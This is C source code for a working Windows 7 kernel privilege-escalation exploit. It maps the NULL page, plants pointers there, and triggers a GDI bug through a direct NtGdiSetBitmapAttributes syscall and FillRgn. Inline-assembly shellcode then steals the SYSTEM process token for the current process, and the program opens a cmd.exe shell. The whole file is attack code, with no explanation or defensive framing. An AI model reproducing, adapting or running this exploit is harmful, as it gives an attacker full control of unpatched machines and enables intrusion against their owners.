#include <Windows.h>
#include <stdio.h>

#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

#ifndef W32KAPI
#define W32KAPI  DECLSPEC_ADDRSAFE
#endif



#define KTHREAD_OFFSET    0x124    // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET   0x050    // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET        0x0B4    // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET      0x0B8    // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET      0x0F8    // nt!_EPROCESS.Token
#define SYSTEM_PID 0x004 // SYSTEM Process PID


int __stdcall TokenStealingShellcodeWin7(int one, int two, int three, int four) {
	__asm {
		; initialize
			pushad; save registers state

			xor eax, eax; Set zero
			mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
			mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

			mov ecx, eax; Copy current _EPROCESS structure

			mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
			mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM
			; to current process
			popad; restore registers state
	}
	return 0;
}

typedef struct _GDICELL {
	LPVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	LPVOID pUserAddress;
} GDICELL, *PGDICELL;

unsigned int demo_CreateBitmapIndirect(void) {
	static BITMAP bitmap = { 0, 8, 8, 2, 1, 1 };
	HBITMAP hBitmap;
	static BYTE bits[8][2] = { 0xFF, 0, 0x0C, 0, 0x0C, 0, 0x0C, 0,
		0xFF, 0, 0xC0, 0, 0xC0, 0, 0xC0, 0 };

	bitmap.bmBits = bits;

	SetLastError(NO_ERROR);

    hBitmap = CreateBitmapIndirect(&bitmap);

	return (unsigned int)hBitmap;
}

#define eSyscall_NtGdiSetBitmapAttributes 0x1110;

typedef NTSTATUS WINAPI NtAllocateVirtualMemory_t(IN HANDLE     ProcessHandle,
	IN OUT PVOID  *BaseAddress,
	IN ULONG      ZeroBits,
	IN OUT PULONG AllocationSize,
	IN ULONG      AllocationType,
	IN ULONG Protect);

W32KAPI HBITMAP NTAPI NtGdiSetBitmapAttributes(
	HBITMAP argv0,
	DWORD argv1
	)
{
	HMODULE _H_NTDLL = NULL;
	PVOID addr_kifastsystemcall = NULL;
	_H_NTDLL = LoadLibrary(TEXT("ntdll.dll"));
	addr_kifastsystemcall = (PVOID)GetProcAddress(_H_NTDLL, "KiFastSystemCall");
	__asm
	{
		push argv1;
		push argv0;
		push 0x00;
		mov eax, eSyscall_NtGdiSetBitmapAttributes;
		mov edx, addr_kifastsystemcall;
		call edx;
		add esp, 0x0c;
	}
}

void Trigger_BSoDPoc() {
	HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();
	HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)0x8f9);

	RECT rect = { 0 };
	rect.left = 0x368c;
	rect.top = 0x400000;
	HRGN hRgn = (HRGN)CreateRectRgnIndirect(&rect);

	HDC hdc = (HDC)CreateCompatibleDC((HDC)0x0);
	SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);

	HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)0x00edfc13);

	FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);
}

void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}

int main(int argc, char* argv[])
{
	HANDLE hProcess;
	DWORD dwPID = GetCurrentProcessId();
	DWORD Virtual_BaseAddr = 1;
	SIZE_T RegionSize = 0x1000;
	
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
	NtAllocateVirtualMemory_t *NtAllocateVirtualMemory;
	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t *)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");
	ULONG VirtualMemory_Result = NtAllocateVirtualMemory(hProcess,
		(LPVOID*)&Virtual_BaseAddr,
		0,
		&RegionSize,
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE);
	if (VirtualMemory_Result != 0x0)
		printf(" [!] Failed to allocate memory at BaseAddress, error: 0x%X\n", VirtualMemory_Result);
	else {
		printf(" [*] Allocated memory at BaseAddress");
	}
	memset(0x0, 0, 0x1000);
	
	void* bypass_one = (void *)0x590;
	*(LPBYTE)bypass_one = 0x1;
	void* bypass_two = (void *)0x592;
	*(LPBYTE)bypass_two = 0x1;
	void* jump_addr = (void *)0x748;
	*(LPDWORD)jump_addr = (DWORD)TokenStealingShellcodeWin7;
	Trigger_BSoDPoc();
	PopShell();
	return 0;
}
